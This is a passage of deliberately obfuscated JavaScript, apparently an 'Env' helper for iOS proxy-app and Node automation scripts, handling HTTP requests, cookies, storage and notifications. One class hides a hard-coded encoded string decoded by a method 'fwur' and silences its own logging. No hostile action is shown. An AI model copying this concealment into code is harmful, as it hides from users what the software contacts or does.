                'H+': new Date()['getHours'](),
                'm+': new Date()['getMinutes'](),
                's+': new Date()['getSeconds'](),
                'q+': Math['floor']((new Date()['getMonth']() + 3) / 3),
                S: new Date()['getMilliseconds'](),
            }
            ;/(y+)/['test'](_0x567c11) && (_0x567c11 = _0x567c11['replace'](RegExp['$1'], (new Date()['getFullYear']() + '')['substr'](4 - RegExp['$1']['length'])))

            for (let _0x27aa4f in _0xe35eb9) new RegExp('(' + _0x27aa4f + ')')['test'](_0x567c11) && (_0x567c11 = _0x567c11['replace'](RegExp['$1'], 1 == RegExp['$1']['length'] ? _0xe35eb9[_0x27aa4f] : ('00' + _0xe35eb9[_0x27aa4f])['substr'](('' + _0xe35eb9[_0x27aa4f])['length'])))

            return _0x567c11
        }

        ['msg'](_0xd412 = _0x1c014a, _0x1ab7b6 = '', _0x307a1c = '', _0x5977e3) {
            const _0x30584d = (_0x4f9bf5) => {
                if (!_0x4f9bf5) {
                    return _0x4f9bf5
                }

                if ('string' == typeof _0x4f9bf5) {
                    return this['isLoon']()
                        ? _0x4f9bf5
                        : this['isQuanX']()
                        ? {
                              'open-url': _0x4f9bf5,
                          }
                        : this['isSurge']()
                        ? {
                              url: _0x4f9bf5,
                          }
                        : void 0
                }

                if ('object' == typeof _0x4f9bf5) {
                    if (this['isLoon']()) {
                        let _0x4aa307 = _0x4f9bf5['openUrl'] || _0x4f9bf5['url'] || _0x4f9bf5['open-url'],
                            _0x105c1c = _0x4f9bf5['mediaUrl'] || _0x4f9bf5['media-url']

                        const _0x1da98d = {
                            openUrl: _0x4aa307,
                            mediaUrl: _0x105c1c,
                        }
                        return _0x1da98d
                    }

                    if (this['isQuanX']()) {
                        let _0x2cb4be = _0x4f9bf5['open-url'] || _0x4f9bf5['url'] || _0x4f9bf5['openUrl'],
                            _0x565ea1 = _0x4f9bf5['media-url'] || _0x4f9bf5['mediaUrl']

                        const _0x2c7959 = {
                            'open-url': _0x2cb4be,
                            'media-url': _0x565ea1,
                        }
                        return _0x2c7959
                    }

                    if (this['isSurge']()) {
                        let _0x46f400 = _0x4f9bf5['url'] || _0x4f9bf5['openUrl'] || _0x4f9bf5['open-url']

                        const _0x433054 = {
                            url: _0x46f400,
                        }
                        return _0x433054
                    }
                }
            }

            this['isMute'] || (this['isSurge']() || this['isLoon']() ? $notification['post'](_0xd412, _0x1ab7b6, _0x307a1c, _0x30584d(_0x5977e3)) : this['isQuanX']() && $notify(_0xd412, _0x1ab7b6, _0x307a1c, _0x30584d(_0x5977e3)))
            let _0x120c04 = ['', '==============📣系统通知📣==============']

            _0x120c04['push'](_0xd412)

            _0x1ab7b6 && _0x120c04['push'](_0x1ab7b6)
            _0x307a1c && _0x120c04['push'](_0x307a1c)
            console['log'](_0x120c04['join']('\n'))
            this['logs'] = this['logs']['concat'](_0x120c04)
        }

        ['log'](..._0x2eb409) {
            _0x2eb409['length'] > 0 && (this['logs'] = [...this['logs'], ..._0x2eb409])
            console['log'](_0x2eb409['join'](this['logSeparator']))
        }

        ['logErr'](_0x5ac841, _0x59a05b) {
            const _0x459354 = !this['isSurge']() && !this['isQuanX']() && !this['isLoon']()

            _0x459354 ? this['log']('', '❗️' + this['name'] + ', 错误!', _0x5ac841['stack']) : this['log']('', '❗️' + this['name'] + ', 错误!', _0x5ac841)
        }

        ['wait'](_0x133968) {
            return new Promise((_0x1dfdd7) => setTimeout(_0x1dfdd7, _0x133968))
        }

        ['done'](_0x3dab4a = {}) {
            const _0x1354c9 = new Date()['getTime'](),
                _0x3108b5 = (_0x1354c9 - this['startTime']) / 1000

            this['log']('', '🔔' + this['name'] + ', 结束! 🕛 ' + _0x3108b5 + ' 秒')
            this['log']()
            ;(this['isSurge']() || this['isQuanX']() || this['isLoon']()) && $done(_0x3dab4a)
        }
    })(_0x1c014a, _0x5c8f07)
}

function FxPCnMKLw7() {
    _keyStr = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='

    this['encode'] = function (_0x1f53f0) {
        var _0x19e7e8 = ''

        var _0x1aac15, _0x6ab6c0, _0x495dfe, _0x2bece0, _0x1b10f7, _0x4a206b, _0x4cad2e

        var _0x41aad0 = 0
        _0x1f53f0 = _utf8_encode(_0x1f53f0)

        while (_0x41aad0 < _0x1f53f0['length']) {
            _0x1aac15 = _0x1f53f0['charCodeAt'](_0x41aad0++)
            _0x6ab6c0 = _0x1f53f0['charCodeAt'](_0x41aad0++)
            _0x495dfe = _0x1f53f0['charCodeAt'](_0x41aad0++)
            _0x2bece0 = _0x1aac15 >> 2
            _0x1b10f7 = ((_0x1aac15 & 3) << 4) | (_0x6ab6c0 >> 4)
            _0x4a206b = ((_0x6ab6c0 & 15) << 2) | (_0x495dfe >> 6)
            _0x4cad2e = _0x495dfe & 63

            if (isNaN(_0x6ab6c0)) {
                _0x4a206b = _0x4cad2e = 64
            } else {
                isNaN(_0x495dfe) && (_0x4cad2e = 64)
            }

            _0x19e7e8 = _0x19e7e8 + _keyStr['charAt'](_0x2bece0) + _keyStr['charAt'](_0x1b10f7) + _keyStr['charAt'](_0x4a206b) + _keyStr['charAt'](_0x4cad2e)
        }

        return _0x19e7e8
    }

    this['decode'] = function (_0x45e9fb) {
        var _0x248b7e = ''

        var _0x37179f, _0x484217, _0x2702b7

        var _0x4f75e8, _0x24cdc8, _0x15edc2, _0x51ee3e

        var _0x619f82 = 0
        _0x45e9fb = _0x45e9fb['replace'](/[^A-Za-z0-9\+\/\=]/g, '')

        while (_0x619f82 < _0x45e9fb['length']) {
            _0x4f75e8 = _keyStr['indexOf'](_0x45e9fb['charAt'](_0x619f82++))
            _0x24cdc8 = _keyStr['indexOf'](_0x45e9fb['charAt'](_0x619f82++))
            _0x15edc2 = _keyStr['indexOf'](_0x45e9fb['charAt'](_0x619f82++))
            _0x51ee3e = _keyStr['indexOf'](_0x45e9fb['charAt'](_0x619f82++))
            _0x37179f = (_0x4f75e8 << 2) | (_0x24cdc8 >> 4)
            _0x484217 = ((_0x24cdc8 & 15) << 4) | (_0x15edc2 >> 2)
            _0x2702b7 = ((_0x15edc2 & 3) << 6) | _0x51ee3e
            _0x248b7e = _0x248b7e + String['fromCharCode'](_0x37179f)
            _0x15edc2 != 64 && (_0x248b7e = _0x248b7e + String['fromCharCode'](_0x484217))
            _0x51ee3e != 64 && (_0x248b7e = _0x248b7e + String['fromCharCode'](_0x2702b7))
        }

        _0x248b7e = _utf8_decode(_0x248b7e)
        return _0x248b7e
    }

    _utf8_encode = function (_0x450362) {
        _0x450362 = _0x450362['replace'](/\r\n/g, '\n')
        var _0x375896 = ''

        for (var _0x581cb9 = 0; _0x581cb9 < _0x450362['length']; _0x581cb9++) {
            var _0x3dda42 = _0x450362['charCodeAt'](_0x581cb9)

            if (_0x3dda42 < 128) {
                _0x375896 += String['fromCharCode'](_0x3dda42)
            } else {
                _0x3dda42 > 127 && _0x3dda42 < 2048
                    ? ((_0x375896 += String['fromCharCode']((_0x3dda42 >> 6) | 192)), (_0x375896 += String['fromCharCode']((_0x3dda42 & 63) | 128)))
                    : ((_0x375896 += String['fromCharCode']((_0x3dda42 >> 12) | 224)), (_0x375896 += String['fromCharCode'](((_0x3dda42 >> 6) & 63) | 128)), (_0x375896 += String['fromCharCode']((_0x3dda42 & 63) | 128)))
            }
        }

        return _0x375896
    }

    _utf8_decode = function (_0x1fecef) {
        var _0xddeec0 = '',
            _0x53b2f3 = 0,
            _0xc0fb02 = (c1 = c2 = 0)

        while (_0x53b2f3 < _0x1fecef['length']) {
            _0xc0fb02 = _0x1fecef['charCodeAt'](_0x53b2f3)

            if (_0xc0fb02 < 128) {
                _0xddeec0 += String['fromCharCode'](_0xc0fb02)
                _0x53b2f3++
            } else {
                _0xc0fb02 > 191 && _0xc0fb02 < 224
                    ? ((c2 = _0x1fecef['charCodeAt'](_0x53b2f3 + 1)), (_0xddeec0 += String['fromCharCode'](((_0xc0fb02 & 31) << 6) | (c2 & 63))), (_0x53b2f3 += 2))
                    : ((c2 = _0x1fecef['charCodeAt'](_0x53b2f3 + 1)), (c3 = _0x1fecef['charCodeAt'](_0x53b2f3 + 2)), (_0xddeec0 += String['fromCharCode'](((_0xc0fb02 & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63))), (_0x53b2f3 += 3))
            }
        }

        return _0xddeec0
    }
}

function rc4(_0x506004, _0xa84b0b) {
    var _0x11f57c = Array(256)

    var _0x32a3ad = Array(_0x506004['length'])

    for (var _0x565c41 = 0; _0x565c41 < 256; _0x565c41++) {
        _0x11f57c[_0x565c41] = _0x565c41

        var _0x284dc8 = (_0x284dc8 + _0x11f57c[_0x565c41] + _0xa84b0b['charCodeAt'](_0x565c41 % _0xa84b0b['length'])) % 256,
            _0x127a4a = _0x11f57c[_0x565c41]

        _0x11f57c[_0x565c41] = _0x11f57c[_0x284dc8]
        _0x11f57c[_0x284dc8] = _0x127a4a
    }

    for (var _0x565c41 = 0; _0x565c41 < _0x506004['length']; _0x565c41++) {
        _0x32a3ad[_0x565c41] = _0x506004['charCodeAt'](_0x565c41)
    }

    for (var _0x545e0f = 0; _0x545e0f < _0x32a3ad['length']; _0x545e0f++) {
        var _0x565c41 = (_0x565c41 + 1) % 256,
            _0x284dc8 = (_0x284dc8 + _0x11f57c[_0x565c41]) % 256,
            _0x127a4a = _0x11f57c[_0x565c41]

        _0x11f57c[_0x565c41] = _0x11f57c[_0x284dc8]
        _0x11f57c[_0x284dc8] = _0x127a4a

        var _0x232683 = (_0x11f57c[_0x565c41] + (_0x11f57c[_0x284dc8] % 256)) % 256

        _0x32a3ad[_0x545e0f] = String['fromCharCode'](_0x32a3ad[_0x545e0f] ^ _0x11f57c[_0x232683])
    }

    return _0x32a3ad['join']('')
}

function Envcc(_0x143e6a, _0x346e43) {
    class _0x5c8cb7 {
        constructor(_0x3c99bf) {
            this['env'] = _0x3c99bf
        }

        ['send'](_0x1eadb8, _0x1ccf3e = 'GET') {
            _0x1eadb8 =
                'string' == typeof _0x1eadb8
                    ? {
                          url: _0x1eadb8,
                      }
                    : _0x1eadb8
            let _0x1ee6da = this['get']
            'POST' === _0x1ccf3e && (_0x1ee6da = this['post'])
            return new Promise((_0x1726fc, _0xa64539) => {
                _0x1ee6da['call'](this, _0x1eadb8, (_0x2c7e83, _0x43bc2e, _0x552ab0) => {
                    _0x2c7e83 ? _0xa64539(_0x2c7e83) : _0x1726fc(_0x43bc2e)
                })
            })
        }

        ['get'](_0x1b4a21) {
            return this['send']['call'](this['env'], _0x1b4a21)
        }

        ['post'](_0x3ee35f) {
            return this['send']['call'](this['env'], _0x3ee35f, 'POST')
        }
    }

    return new (class {
        constructor(_0x43c376, _0x105070) {
            this['name'] = _0x43c376
            this['http'] = new _0x5c8cb7(this)
            this['data'] = null
            this['dataFile'] = 'box.dat'
            this['logs'] = []
            this['isMute'] = false
            this['isNeedRewrite'] = false
            this['logSeparator'] = '\n'
            this['encoding'] = 'utf-8'
            this['startTime'] = new Date()['getTime']()
            Object['assign'](this, _0x105070)
            this['log']('', '🔔' + this['name'] + ', 开始!')
        }

        ['isNode']() {
            return 'undefined' != typeof module && !!module['exports']
        }

        ['isQuanX']() {
            return 'undefined' != typeof $task
        }

        ['isSurge']() {
            return 'undefined' != typeof $httpClient && 'undefined' == typeof $loon
        }

        ['isLoon']() {
            return 'undefined' != typeof $loon
        }

        ['isShadowrocket']() {
            return 'undefined' != typeof $rocket
        }

        ['toObj'](_0x44f8e0, _0x544fc7 = null) {
            try {
                return JSON['parse'](_0x44f8e0)
            } catch {
                return _0x544fc7
            }
        }

        ['toStr'](_0x16a05e, _0x56536d = null) {
            try {
                return JSON['stringify'](_0x16a05e)
            } catch {
                return _0x56536d
            }
        }

        ['getjson'](_0x42aa28, _0x2df2a6) {
            let _0x3baaaa = _0x2df2a6

            const _0x4f1834 = this['getdata'](_0x42aa28)

            if (_0x4f1834) {
                try {
                    _0x3baaaa = JSON['parse'](this['getdata'](_0x42aa28))
                } catch {}
            }

            return _0x3baaaa
        }

        ['setjson'](_0x42ce9f, _0x2ba0f1) {
            try {
                return this['setdata'](JSON['stringify'](_0x42ce9f), _0x2ba0f1)
            } catch {
                return false
            }
        }

        ['getScript'](_0x1acd9d) {
            return new Promise((_0x4f6ea5) => {
                this['get'](
                    {
                        url: _0x1acd9d,
                    },
                    (_0x4cf16c, _0x4e3a06, _0xe2bebf) => _0x4f6ea5(_0xe2bebf)
                )
            })
        }

        ['runScript'](_0x4bd429, _0x5973ee) {
            return new Promise((_0x3cfc3d) => {
                let _0x2062fd = this['getdata']('@chavy_boxjs_userCfgs.httpapi')

                _0x2062fd = _0x2062fd ? _0x2062fd['replace'](/\n/g, '')['trim']() : _0x2062fd

                let _0x3adfd9 = this['getdata']('@chavy_boxjs_userCfgs.httpapi_timeout')

                _0x3adfd9 = _0x3adfd9 ? 1 * _0x3adfd9 : 20
                _0x3adfd9 = _0x5973ee && _0x5973ee['timeout'] ? _0x5973ee['timeout'] : _0x3adfd9

                const [_0x418b08, _0x3e1dbf] = _0x2062fd['split']('@'),
                    _0x50fa55 = {
                        url: 'http://' + _0x3e1dbf + '/v1/scripting/evaluate',
                        body: {
                            script_text: _0x4bd429,
                            mock_type: 'cron',
                            timeout: _0x3adfd9,
                        },
                        headers: {
                            'X-Key': _0x418b08,
                            Accept: '*/*',
                        },
                    }

                this['post'](_0x50fa55, (_0x52f474, _0x5eed4a, _0x3ccee1) => _0x3cfc3d(_0x3ccee1))
            })['catch']((_0x7c4ee5) => this['logErr'](_0x7c4ee5))
        }

        ['loaddata']() {
            if (!this['isNode']()) {
                return {}
            }

            {
                this['fs'] = this['fs'] ? this['fs'] : require('fs')
                this['path'] = this['path'] ? this['path'] : require('path')

                const _0x2d2cb6 = this['path']['resolve'](this['dataFile']),
                    _0x34b22b = this['path']['resolve'](process['cwd'](), this['dataFile']),
                    _0x50da2a = this['fs']['existsSync'](_0x2d2cb6),
                    _0xa14bfa = !_0x50da2a && this['fs']['existsSync'](_0x34b22b)

                if (!_0x50da2a && !_0xa14bfa) {
                    return {}
                }

                {
                    const _0x271d14 = _0x50da2a ? _0x2d2cb6 : _0x34b22b

                    try {
                        return JSON['parse'](this['fs']['readFileSync'](_0x271d14))
                    } catch (_0x4d1dcc) {
                        return {}
                    }
                }
            }
        }

        ['writedata']() {
            if (this['isNode']()) {
                this['fs'] = this['fs'] ? this['fs'] : require('fs')
                this['path'] = this['path'] ? this['path'] : require('path')

                const _0x56deef = this['path']['resolve'](this['dataFile']),
                    _0x54860d = this['path']['resolve'](process['cwd'](), this['dataFile']),
                    _0x4cba8b = this['fs']['existsSync'](_0x56deef),
                    _0x2542f5 = !_0x4cba8b && this['fs']['existsSync'](_0x54860d),
                    _0x29bce6 = JSON['stringify'](this['data'])

                _0x4cba8b ? this['fs']['writeFileSync'](_0x56deef, _0x29bce6) : _0x2542f5 ? this['fs']['writeFileSync'](_0x54860d, _0x29bce6) : this['fs']['writeFileSync'](_0x56deef, _0x29bce6)
            }
        }

        ['lodash_get'](_0x1eed09, _0x36654e, _0x1cc191) {
            const _0x467ea9 = _0x36654e['replace'](/\[(\d+)\]/g, '.$1')['split']('.')

            let _0x33b13b = _0x1eed09

            for (const _0x6dc6b0 of _0x467ea9)
                if (((_0x33b13b = Object(_0x33b13b)[_0x6dc6b0]), void 0 === _0x33b13b)) {
                    return _0x1cc191
                }

            return _0x33b13b
        }

        ['lodash_set'](_0x4b3e37, _0x38487e, _0x5cba89) {
            return Object(_0x4b3e37) !== _0x4b3e37
                ? _0x4b3e37
                : (Array['isArray'](_0x38487e) || (_0x38487e = _0x38487e['toString']()['match'](/[^.[\]]+/g) || []),
                  (_0x38487e['slice'](0, -1)['reduce']((_0x5f401d, _0x266eab, _0x407b4e) => (Object(_0x5f401d[_0x266eab]) === _0x5f401d[_0x266eab] ? _0x5f401d[_0x266eab] : (_0x5f401d[_0x266eab] = Math['abs'](_0x38487e[_0x407b4e + 1]) >> 0 == +_0x38487e[_0x407b4e + 1] ? [] : {})), _0x4b3e37)[
                      _0x38487e[_0x38487e['length'] - 1]
                  ] = _0x5cba89),
                  _0x4b3e37)
        }

        ['getdata'](_0x2ea3b4) {
            let _0x1f25f1 = this['getval'](_0x2ea3b4)

            if (/^@/['test'](_0x2ea3b4)) {
                const [, _0xad63a6, _0x3004df] = /^@(.*?)\.(.*?)$/['exec'](_0x2ea3b4),
                    _0x2ba634 = _0xad63a6 ? this['getval'](_0xad63a6) : ''

                if (_0x2ba634) {
                    try {
                        const _0x2ba19f = JSON['parse'](_0x2ba634)

                        _0x1f25f1 = _0x2ba19f ? this['lodash_get'](_0x2ba19f, _0x3004df, '') : _0x1f25f1
                    } catch (_0x384027) {
                        _0x1f25f1 = ''
                    }
                }
            }

            return _0x1f25f1
        }

        ['setdata'](_0x245486, _0x31ab05) {
            let _0x21f567 = false

            if (/^@/['test'](_0x31ab05)) {
                const [, _0x39413e, _0x382a7c] = /^@(.*?)\.(.*?)$/['exec'](_0x31ab05),
                    _0x122ef3 = this['getval'](_0x39413e),
                    _0x304a61 = _0x39413e ? ('null' === _0x122ef3 ? null : _0x122ef3 || '{}') : '{}'

                try {
                    const _0x1e2078 = JSON['parse'](_0x304a61)

                    this['lodash_set'](_0x1e2078, _0x382a7c, _0x245486)
                    _0x21f567 = this['setval'](JSON['stringify'](_0x1e2078), _0x39413e)
                } catch (_0x45edbb) {
                    const _0x1e0389 = {}
                    this['lodash_set'](_0x1e0389, _0x382a7c, _0x245486)
                    _0x21f567 = this['setval'](JSON['stringify'](_0x1e0389), _0x39413e)
                }
            } else {
                _0x21f567 = this['setval'](_0x245486, _0x31ab05)
            }

            return _0x21f567
        }

        ['getval'](_0x68f0e5) {
            return this['isSurge']() || this['isLoon']() ? $persistentStore['read'](_0x68f0e5) : this['isQuanX']() ? $prefs['valueForKey'](_0x68f0e5) : this['isNode']() ? ((this['data'] = this['loaddata']()), this['data'][_0x68f0e5]) : (this['data'] && this['data'][_0x68f0e5]) || null
        }

        ['setval'](_0x246580, _0xb8d923) {
            return this['isSurge']() || this['isLoon']()
                ? $persistentStore['write'](_0x246580, _0xb8d923)
                : this['isQuanX']()
                ? $prefs['setValueForKey'](_0x246580, _0xb8d923)
                : this['isNode']()
                ? ((this['data'] = this['loaddata']()), (this['data'][_0xb8d923] = _0x246580), this['writedata'](), true)
                : (this['data'] && this['data'][_0xb8d923]) || null
        }

        ['initGotEnv'](_0x240b97) {
            this['got'] = this['got'] ? this['got'] : require('got')
            this['cktough'] = this['cktough'] ? this['cktough'] : require('tough-cookie')
            this['ckjar'] = this['ckjar'] ? this['ckjar'] : new this['cktough']['CookieJar']()
            _0x240b97 && ((_0x240b97['headers'] = _0x240b97['headers'] ? _0x240b97['headers'] : {}), void 0 === _0x240b97['headers']['Cookie'] && void 0 === _0x240b97['cookieJar'] && (_0x240b97['cookieJar'] = this['ckjar']))
        }

        ['get'](_0x587e0c, _0x215729 = () => {}) {
            if ((_0x587e0c['headers'] && (delete _0x587e0c['headers']['Content-Type'], delete _0x587e0c['headers']['Content-Length']), this['isSurge']() || this['isLoon']())) {
                this['isSurge']() &&
                    this['isNeedRewrite'] &&
                    ((_0x587e0c['headers'] = _0x587e0c['headers'] || {}),
                    Object['assign'](_0x587e0c['headers'], {
                        'X-Surge-Skip-Scripting': false,
                    }))
                $httpClient['get'](_0x587e0c, (_0x1508d2, _0x53d48b, _0x6d5daf) => {
                    !_0x1508d2 && _0x53d48b && ((_0x53d48b['body'] = _0x6d5daf), (_0x53d48b['statusCode'] = _0x53d48b['status']))

                    _0x215729(_0x1508d2, _0x53d48b, _0x6d5daf)
                })
            } else {
                if (this['isQuanX']()) {
                    this['isNeedRewrite'] &&
                        ((_0x587e0c['opts'] = _0x587e0c['opts'] || {}),
                        Object['assign'](_0x587e0c['opts'], {
                            hints: false,
                        }))
                    $task['fetch'](_0x587e0c)['then'](
                        (_0x33dc06) => {
                            const { statusCode: _0x206b46, statusCode: _0x25173b, headers: _0x727d5e, body: _0x50aff0 } = _0x33dc06

                            _0x215729(
                                null,
                                {
                                    status: _0x206b46,
                                    statusCode: _0x25173b,
                                    headers: _0x727d5e,
                                    body: _0x50aff0,
                                },
                                _0x50aff0
                            )
                        },
                        (_0x4463c4) => _0x215729(_0x4463c4)
                    )
                } else {
                    if (this['isNode']()) {
                        let _0x2d5e90 = require('iconv-lite')

                        this['initGotEnv'](_0x587e0c)
                        this['got'](_0x587e0c)
                            ['on']('redirect', (_0x491942, _0x2dbe13) => {
                                try {
                                    if (_0x491942['headers']['set-cookie']) {
                                        const _0x33e32c = _0x491942['headers']['set-cookie']['map'](this['cktough']['Cookie']['parse'])['toString']()

                                        _0x33e32c && this['ckjar']['setCookieSync'](_0x33e32c, null)
                                        _0x2dbe13['cookieJar'] = this['ckjar']
                                    }
                                } catch (_0xd6ad35) {
                                    this['logErr'](_0xd6ad35)
                                }
                            })
                            ['then'](
                                (_0xbd6212) => {
                                    const { statusCode: _0x203ee3, statusCode: _0x37ecad, headers: _0x5ece8f, rawBody: _0x5d058c } = _0xbd6212

                                    _0x215729(
                                        null,
                                        {
                                            status: _0x203ee3,
                                            statusCode: _0x37ecad,
                                            headers: _0x5ece8f,
                                            rawBody: _0x5d058c,
                                        },
                                        _0x2d5e90['decode'](_0x5d058c, this['encoding'])
                                    )
                                },
                                (_0x328be0) => {
                                    const { message: _0x30e17f, response: _0x3a70cc } = _0x328be0

                                    _0x215729(_0x30e17f, _0x3a70cc, _0x3a70cc && _0x2d5e90['decode'](_0x3a70cc['rawBody'], this['encoding']))
                                }
                            )
                    }
                }
            }
        }

        ['post'](_0xda76cb, _0xd834de = () => {}) {
            const _0x4d6e1c = _0xda76cb['method'] ? _0xda76cb['method']['toLocaleLowerCase']() : 'post'

            if ((_0xda76cb['body'] && _0xda76cb['headers'] && !_0xda76cb['headers']['Content-Type'] && (_0xda76cb['headers']['Content-Type'] = 'application/x-www-form-urlencoded'), _0xda76cb['headers'] && delete _0xda76cb['headers']['Content-Length'], this['isSurge']() || this['isLoon']())) {
                this['isSurge']() &&
                    this['isNeedRewrite'] &&
                    ((_0xda76cb['headers'] = _0xda76cb['headers'] || {}),
                    Object['assign'](_0xda76cb['headers'], {
                        'X-Surge-Skip-Scripting': false,
                    }))

                $httpClient[_0x4d6e1c](_0xda76cb, (_0x39f077, _0x185481, _0x2dc286) => {
                    !_0x39f077 && _0x185481 && ((_0x185481['body'] = _0x2dc286), (_0x185481['statusCode'] = _0x185481['status']))

                    _0xd834de(_0x39f077, _0x185481, _0x2dc286)
                })
            } else {
                if (this['isQuanX']()) {
                    _0xda76cb['method'] = _0x4d6e1c
                    this['isNeedRewrite'] &&
                        ((_0xda76cb['opts'] = _0xda76cb['opts'] || {}),
                        Object['assign'](_0xda76cb['opts'], {
                            hints: false,
                        }))
                    $task['fetch'](_0xda76cb)['then'](
                        (_0x4188c0) => {
                            const { statusCode: _0x4ac2b6, statusCode: _0x27e778, headers: _0x2a525b, body: _0x1bc381 } = _0x4188c0

                            _0xd834de(
                                null,
                                {
                                    status: _0x4ac2b6,
                                    statusCode: _0x27e778,
                                    headers: _0x2a525b,
                                    body: _0x1bc381,
                                },
                                _0x1bc381
                            )
                        },
                        (_0x274372) => _0xd834de(_0x274372)
                    )
                } else {
                    if (this['isNode']()) {
                        let _0x473441 = require('iconv-lite')

                        this['initGotEnv'](_0xda76cb)
                        const { url: _0x17974f, ..._0x3269f2 } = _0xda76cb

                        this['got'][_0x4d6e1c](_0x17974f, _0x3269f2)['then'](
                            (_0x788bbf) => {
                                const { statusCode: _0xf6003f, statusCode: _0x345a45, headers: _0x5f5617, rawBody: _0x55a704 } = _0x788bbf

                                _0xd834de(
                                    null,
                                    {
                                        status: _0xf6003f,
                                        statusCode: _0x345a45,
                                        headers: _0x5f5617,
                                        rawBody: _0x55a704,
                                    },
                                    _0x473441['decode'](_0x55a704, this['encoding'])
                                )
                            },
                            (_0x196042) => {
                                const { message: _0x1024a7, response: _0x14cfa2 } = _0x196042

                                _0xd834de(_0x1024a7, _0x14cfa2, _0x14cfa2 && _0x473441['decode'](_0x14cfa2['rawBody'], this['encoding']))
                            }
                        )
                    }
                }
            }
        }

        ['time'](_0x16db8f, _0x4aab30 = null) {
            const _0x327394 = _0x4aab30 ? new Date(_0x4aab30) : new Date()

            let _0x4b0d61 = {
                'M+': _0x327394['getMonth']() + 1,
                'd+': _0x327394['getDate'](),
                'H+': _0x327394['getHours'](),
                'm+': _0x327394['getMinutes'](),
                's+': _0x327394['getSeconds'](),
                'q+': Math['floor']((_0x327394['getMonth']() + 3) / 3),
                S: _0x327394['getMilliseconds'](),
            }
            ;/(y+)/['test'](_0x16db8f) && (_0x16db8f = _0x16db8f['replace'](RegExp['$1'], (_0x327394['getFullYear']() + '')['substr'](4 - RegExp['$1']['length'])))

            for (let _0x539534 in _0x4b0d61) new RegExp('(' + _0x539534 + ')')['test'](_0x16db8f) && (_0x16db8f = _0x16db8f['replace'](RegExp['$1'], 1 == RegExp['$1']['length'] ? _0x4b0d61[_0x539534] : ('00' + _0x4b0d61[_0x539534])['substr'](('' + _0x4b0d61[_0x539534])['length'])))

            return _0x16db8f
        }

        ['msg'](_0x16af41 = _0x143e6a, _0x3d95d4 = '', _0x36fb25 = '', _0x5b9a14) {
            const _0x29f8fb = (_0x3f699b) => {
                if (!_0x3f699b) {
                    return _0x3f699b
                }

                if ('string' == typeof _0x3f699b) {
                    return this['isLoon']()
                        ? _0x3f699b
                        : this['isQuanX']()
                        ? {
                              'open-url': _0x3f699b,
                          }
                        : this['isSurge']()
                        ? {
                              url: _0x3f699b,
                          }
                        : void 0
                }

                if ('object' == typeof _0x3f699b) {
                    if (this['isLoon']()) {
                        let _0x414a32 = _0x3f699b['openUrl'] || _0x3f699b['url'] || _0x3f699b['open-url'],
                            _0x4cf7d2 = _0x3f699b['mediaUrl'] || _0x3f699b['media-url']

                        return {
                            openUrl: _0x414a32,
                            mediaUrl: _0x4cf7d2,
                        }
                    }

                    if (this['isQuanX']()) {
                        let _0x11c359 = _0x3f699b['open-url'] || _0x3f699b['url'] || _0x3f699b['openUrl'],
                            _0x5b9c44 = _0x3f699b['media-url'] || _0x3f699b['mediaUrl']

                        return {
                            'open-url': _0x11c359,
                            'media-url': _0x5b9c44,
                        }
                    }

                    if (this['isSurge']()) {
                        let _0x35b685 = _0x3f699b['url'] || _0x3f699b['openUrl'] || _0x3f699b['open-url']

                        return {
                            url: _0x35b685,
                        }
                    }
                }
            }

            if ((this['isMute'] || (this['isSurge']() || this['isLoon']() ? $notification['post'](_0x16af41, _0x3d95d4, _0x36fb25, _0x29f8fb(_0x5b9a14)) : this['isQuanX']() && $notify(_0x16af41, _0x3d95d4, _0x36fb25, _0x29f8fb(_0x5b9a14))), !this['isMuteLog'])) {
                let _0x3a88a5 = ['', '==============📣系统通知📣==============']

                _0x3a88a5['push'](_0x16af41)

                _0x3d95d4 && _0x3a88a5['push'](_0x3d95d4)
                _0x36fb25 && _0x3a88a5['push'](_0x36fb25)
                console['log'](_0x3a88a5['join']('\n'))
                this['logs'] = this['logs']['concat'](_0x3a88a5)
            }
        }

        ['fwcaas']() {
            return 'fkRGREUCFRNfMCtqKj0lLiE/OXowLTRz'
        }

        ['log'](..._0x58312d) {}

        ['logErr'](_0x531ba8, _0x18b393) {
            const _0x454813 = !this['isSurge']() && !this['isQuanX']() && !this['isLoon']()

            _0x454813 ? this['log']('', '❗️' + this['name'] + ', 错误!', _0x531ba8['stack']) : this['log']('', '❗️' + this['name'] + ', 错误!', _0x531ba8)
        }

        ['fwur']() {
            var _0x2156bb = new FxPCnMKLw7()

            return _0x2156bb['decode'](this['fwcaas']())
        }

        ['wait'](_0x1501af) {
            return new Promise((_0xab6a4b) => setTimeout(_0xab6a4b, _0x1501af))
        }

        ['done'](_0x4c7ebb = {}) {
            const _0x39671f = new Date()['getTime'](),
                _0x4e4e47 = (_0x39671f - this['startTime']) / 1000

            this['log']('', '🔔' + this['name'] + ', 结束! 🕛 ' + _0x4e4e47 + ' 秒')
            this['log']()
            ;(this['isSurge']() || this['isQuanX']() || this['isLoon']()) && $done(_0x4c7ebb)
        }
    })(_0x143e6a, _0x346e43)
}
